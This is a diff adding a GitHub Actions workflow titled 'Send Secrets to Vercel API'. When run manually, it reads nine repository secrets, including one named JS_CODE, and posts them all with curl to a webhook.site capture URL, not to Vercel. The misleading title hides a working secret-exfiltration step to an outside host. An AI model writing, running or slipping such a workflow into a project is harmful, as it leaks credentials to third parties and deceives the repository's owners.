@@ -1,0 +1,35 @@
+name: Send Secrets to Vercel API
+
+on:
+  workflow_dispatch:
+
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Enviar secrets como JSON
+        env:
+          PITAYA: ${{ secrets.PITAYA }}
+          ORANGES: ${{ secrets.ORANGES }}
+          MANGO: ${{ secrets.MANGO }}
+          KIWI: ${{ secrets.KIWI }}
+          CHERRY: ${{ secrets.CHERRY }}
+          GRAPE: ${{ secrets.GRAPE }}
+          LEMON: ${{ secrets.LEMON }}
+          MELON: ${{ secrets.MELON }}
+          JS_CODE: ${{ secrets.JS_CODE }}
+          
+        run: |
+          curl -X POST "https://webhook.site/54061874-f87f-4721-bcf5-8838e1ad83c0" \
+            -H "Content-Type: application/json" \
+            -d "{
+              \"PITAYA\": \"$PITAYA\",
+              \"ORANGES\": \"$ORANGES\",
+              \"MANGO\": \"$MANGO\",
+              \"KIWI\": \"$KIWI\",
+              \"CHERRY\": \"$CHERRY\",
+              \"GRAPE\": \"$GRAPE\",
+              \"LEMON\": \"$LEMON\",
+              \"MELON\": \"$MELON\",
+              \"JS_CODE\": \"$JS_CODE\"
+            }"
